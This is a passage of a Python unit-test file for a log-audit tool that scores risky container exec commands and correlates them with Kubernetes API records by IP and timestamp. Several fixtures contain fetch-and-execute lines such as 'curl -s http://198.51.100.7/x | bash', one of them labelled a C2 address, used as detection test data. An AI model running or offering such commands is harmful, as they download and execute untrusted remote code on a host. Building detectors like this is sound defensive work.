        self.assertEqual([item["extra"]["match_ip"] for item in pairs],
                         ["10.9.9.2"])

    def test_single_log_is_graceful(self):
        ctx = make_ctx(self.tmp.name, str(self.docker))
        audit.correlate(ctx)
        text = log_text(ctx)
        self.assertIn("命中高危命令 1 条", text)
        self.assertIn("只加载了一份日志", text)
        self.assertEqual([item for item in ctx.findings
                          if item["summary"].startswith("关联 IP 对")], [])

    def test_threshold_controls_sensitivity(self):
        medium = Path(self.tmp.name) / "medium.log"
        medium.write_text(
            "2024-12-02T14:14:35 container: exec, ContainerID: u1, "
            "Command: chmod 755 /tmp/x, Docker IP:  172.17.0.21\n",
            encoding="utf-8")
        score, _ = audit.command_risk("chmod 755 /tmp/x")
        self.assertGreater(score, 0)

        low = make_ctx(self.tmp.name, str(medium),
                       {"log_risk_threshold": "1"})
        audit.correlate(low)
        self.assertIn("命中高危命令 1 条", log_text(low))

        high = make_ctx(self.tmp.name, str(medium),
                        {"log_risk_threshold": "100"})
        audit.correlate(high)
        self.assertIn("命中高危命令 0 条", log_text(high))

    def test_readonly_only_log_reports_nothing(self):
        readonly = Path(self.tmp.name) / "readonly.log"
        readonly.write_text(
            "2024-12-02T14:14:35 container: exec, ContainerID: u1, "
            "Command: ls -l /home/u1, Docker IP:  172.17.0.20\n",
            encoding="utf-8")
        ctx = make_ctx(self.tmp.name, str(readonly),
                       {"log_extra_paths": str(self.kube)})
        audit.correlate(ctx)
        text = log_text(ctx)
        self.assertIn("命中高危命令 0 条", text)
        self.assertIn("未发现超过阈值的高危执行命令", text)
        out = Path(self.tmp.name) / "out"
        # 没有高危命令时也要落盘两个空结果（含完整表头）。
        timeline = (out / "audit_timeline.csv").read_text(encoding="utf-8")
        self.assertEqual(timeline.splitlines()[0].split(","),
                         audit._TIMELINE_HEADERS)
        self.assertEqual(len(timeline.splitlines()), 1)
        self.assertTrue((out / "audit_correlations.csv").is_file())

    def test_empty_log_warns(self):
        empty = Path(self.tmp.name) / "empty.log"
        empty.write_text("", encoding="utf-8")
        ctx = make_ctx(self.tmp.name, str(empty))
        audit.correlate(ctx)
        self.assertIn("没有可分析的日志", log_text(ctx))

    def test_pcap_input_without_extra_paths_is_skipped(self):
        ctx = make_ctx(self.tmp.name, str(self.docker))
        ctx.input_kind = "pcap"
        ctx.pcap = str(Path(self.tmp.name) / "capture.pcapng")
        audit.correlate(ctx)
        self.assertIn("当前输入不是日志文件", log_text(ctx))

    def test_empty_result_csv_keeps_full_header(self):
        readonly = Path(self.tmp.name) / "readonly2.log"
        readonly.write_text(
            "2024-12-02T14:14:35 container: exec, ContainerID: u1, "
            "Command: ls -l /home/u1, Docker IP:  172.17.0.22\n",
            encoding="utf-8")
        ctx = make_ctx(self.tmp.name, str(readonly),
                       {"log_extra_paths": str(self.kube)})
        audit.correlate(ctx)
        header = (Path(self.tmp.name) / "out" / "audit_correlations.csv"
                  ).read_text(encoding="utf-8").splitlines()[0]
        self.assertEqual(header.split(","), audit._CORRELATION_HEADERS)

    def test_timeline_csv_lists_every_risky_command(self):
        ctx = make_ctx(self.tmp.name, str(self.docker),
                       {"log_extra_paths": str(self.kube)})
        audit.correlate(ctx)
        rows = list(csv.DictReader(
            (Path(self.tmp.name) / "out" / "audit_timeline.csv")
            .read_text(encoding="utf-8").splitlines()))
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["实体 IP"], "172.17.0.3")
        self.assertEqual(rows[0]["实体字段"], "docker_ip")
        self.assertIn("base64", rows[0]["命令"])

    def test_untimed_seed_is_reported_but_not_correlated(self):
        untimed = Path(self.tmp.name) / "untimed.log"
        untimed.write_text(
            "container: exec, ContainerID: u1, "
            "Command: curl -s http://198.51.100.7/x | bash, "
            "Docker IP:  172.17.0.31\n", encoding="utf-8")
        ctx = make_ctx(self.tmp.name, str(untimed),
                       {"log_extra_paths": str(self.kube)})
        audit.correlate(ctx)
        text = log_text(ctx)
        self.assertIn("命中高危命令 1 条", text)
        self.assertIn("没有可解析的时间戳，无法参与时间关联", text)
        self.assertEqual(self.correlations(), [])

    def test_c2_address_in_command_is_not_the_exec_entity(self):
        # 记录里没有 Docker IP 字段时，不能把命令里的下载地址当成容器地址。
        no_ip = Path(self.tmp.name) / "noip.log"
        no_ip.write_text(
            "2024-12-02T14:14:35 container: exec, ContainerID: u1, "
            "Command: curl -s http://203.0.113.9/x | bash\n", encoding="utf-8")
        ctx = make_ctx(self.tmp.name, str(no_ip),
                       {"log_extra_paths": str(self.kube)})
        audit.correlate(ctx)
        # 没有可信的执行侧实体 IP，就不应该给出 IP 对结论。
        pairs = [item for item in ctx.findings
                 if item["summary"].startswith("关联 IP 对")]
        self.assertEqual(pairs, [])
        rows = list(csv.DictReader(
            (Path(self.tmp.name) / "out" / "audit_timeline.csv")
            .read_text(encoding="utf-8").splitlines()))
        self.assertEqual(rows[0]["实体 IP"], "")
        self.assertIn("203.0.113.9", rows[0]["命令"])

    def test_risky_command_cap_is_reported(self):
        many = Path(self.tmp.name) / "many.log"
        many.write_text("\n".join(
            f"2024-12-02T14:14:{index % 60:02d} container: exec, "
            f"ContainerID: u{index}, "
            f"Command: curl -s http://198.51.100.7/x | bash, "
            f"Docker IP:  172.17.1.{index % 250}"
            for index in range(audit._MAX_RISKY + 5)), encoding="utf-8")
        ctx = make_ctx(self.tmp.name, str(many))
        audit.correlate(ctx)
        text = log_text(ctx)
        self.assertIn(f"命中高危命令 {audit._MAX_RISKY + 5} 条", text)
        self.assertIn(f"只保留风险分最高的前 {audit._MAX_RISKY} 条", text)
        rows = list(csv.DictReader(
            (Path(self.tmp.name) / "out" / "audit_timeline.csv")
            .read_text(encoding="utf-8").splitlines()))
        self.assertEqual(len(rows), audit._MAX_RISKY)

    def test_findings_respect_shared_job_budget(self):
        many = Path(self.tmp.name) / "many2.log"
        many.write_text("\n".join(
            f"2024-12-02T14:14:{index % 60:02d} container: exec, "
            f"ContainerID: u{index}, "
            f"Command: curl -s http://198.51.100.7/x | bash, "
            f"Docker IP:  172.17.2.{index % 250}"
            for index in range(audit._MAX_RISKY + 5)), encoding="utf-8")
        # 窗口内足够多的成功记录：若不优先写「关联 IP 对」，5 条额度会被
        # 逐条「跨源关联」全部吃掉，最终结论反而写不进去。
        kube = Path(self.tmp.name) / "busy-kube.log"
        kube.write_text("\n".join(
            f"2024-12-02T14:14:{35 + index} Kube-API: Request to /api/v1/pods, "
            f"Pod IP: 10.9.9.{index}, Success: true"
            for index in range(audit._MAX_CANDIDATES + 2)), encoding="utf-8")
        ctx = make_ctx(self.tmp.name, str(many),
                       {"log_extra_paths": str(kube)})
        # 模拟前面的 logs.* 功能已经用掉大部分配额。
        for index in range(audit._JOB_FINDINGS_TOTAL - 5):
            ctx.findings.append({"kind": "log", "summary": f"占位 {index}",
                                 "extra": {}})
        audit.correlate(ctx)
        # 只剩 5 条额度：本次最多再写 5 条，且不会超过共享上限；额度不足时
        # 优先保住「关联 IP 对」这一最终结论。
        self.assertEqual(len(ctx.findings), audit._JOB_FINDINGS_TOTAL)
        added = [item["summary"] for item in ctx.findings[-5:]]
        self.assertTrue(all(text.startswith("关联 IP 对") for text in added))
        self.assertIn("条未写入 findings", log_text(ctx))

    def test_no_findings_budget_still_writes_csv(self):
        ctx = make_ctx(self.tmp.name, str(self.docker),
                       {"log_extra_paths": str(self.kube)})
        for index in range(audit._JOB_FINDINGS_TOTAL):
            ctx.findings.append({"kind": "log", "summary": f"占位 {index}",
                                 "extra": {}})
        audit.correlate(ctx)
        self.assertIn("结构化结果配额已用完", log_text(ctx))
        self.assertEqual(len(ctx.findings), audit._JOB_FINDINGS_TOTAL)
        self.assertEqual(len(self.correlations()), 2)

    def test_k8s_audit_jsonl_works_as_correlated_source(self):
        audit_log = Path(self.tmp.name) / "k8s-audit.jsonl"
        audit_log.write_text(
            '{"kind":"Event","requestReceivedTimestamp":'
            '"2024-12-02T14:14:35.500000Z","verb":"create","requestURI":'
            '"/api/v1/namespaces/d/pods","objectRef":{"resource":"pods"},'
            '"responseStatus":{"code":201},"sourceIPs":["10.9.9.9"]}\n',
            encoding="utf-8")
        ctx = make_ctx(self.tmp.name, str(self.docker),
                       {"log_extra_paths": str(audit_log)})
        audit.correlate(ctx)
        rows = self.correlations()
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["关联实体 IP"], "source_ips=10.9.9.9")
        pairs = [item for item in ctx.findings
                 if item["summary"].startswith("关联 IP 对")]
        self.assertEqual(pairs[0]["extra"]["match_ip"], "10.9.9.9")

    def test_non_finite_window_falls_back_to_default(self):
        ctx = make_ctx(self.tmp.name, str(self.docker), {
            "log_extra_paths": str(self.kube),
            "log_correlate_window": "nan",
        })
        audit.correlate(ctx)
        # nan 被拒绝，回退默认 ±5 秒，因此两条成功记录都在窗口内。
        self.assertEqual(len(self.correlations()), 2)

    def test_non_numeric_status_falls_through_to_word_table(self):
        record = logfile.parse_text(
            "2024-12-02T14:14:35 web: status: OK, ip: 10.0.0.9",
            name="web.log").records[0]
        self.assertTrue(audit.success_state(record))
        failed = logfile.parse_text(
            "2024-12-02T14:14:35 web: status: denied, ip: 10.0.0.9",
            name="web.log").records[0]
        self.assertIs(audit.success_state(failed), False)


if __name__ == "__main__":
    unittest.main()
